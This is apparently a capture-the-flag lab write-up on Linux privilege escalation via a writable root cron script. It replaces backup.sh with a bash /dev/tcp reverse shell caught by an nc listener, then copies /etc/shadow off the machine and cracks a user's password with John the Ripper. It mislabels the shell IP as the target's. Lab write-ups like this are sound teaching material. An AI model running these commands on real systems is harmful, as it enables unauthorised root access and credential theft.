# Cron jobs

Cron jobs are scheduled tasks that execute scripts or binaries at specified times, running with the privileges of their owners rather than the current user. While properly configured cron jobs are generally secure, they can become a vector for privilege escalation under certain conditions.

The concept is straightforward: if a cron job runs with root privileges and we can modify the script it executes, we can potentially run our own script with root access.

Cron job configurations are stored in crontabs (cron tables), which allow users to see when tasks are scheduled to run. Each user has their own crontab file, enabling them to schedule tasks regardless of whether they are logged in. The objective is to identify a cron job set by the root user and manipulate it to execute our script, preferably a shell.



### How many user-defined cron jobs can you see on the target system?

Use the following command to list the cron jobs:

```bash
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

In can see in total of four cron jobs.

### What is the content of flag5.txt?

The flag5.txt is located in /home/ubuntu, but we don't have permissions to see it's content with the current user:

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Let's modify the current backup.sh:

```bash
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
```

Into a reverse shell with the IP of our target machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.24.100/6666 0>&1
```

Make the file executable:

```bash
chmod +x backup.sh
```

<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

We setup our listener in the attack machine, and within a minute we should receive a connection:

```bash
nc -nlvp 6666
```

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Let's move to **/home/ubuntu** and look of the content of the flag5.txt

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

### What is the Matt's password?

**Step 1: Copy /etc/passwd and /etc/shadow to the attack machine**

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

**Step 2: Crack the hash**

Use unshadow to combine both files

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

And then use John the Ripper to Crack the hash:

```bash
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

And we successfully found matt's password!
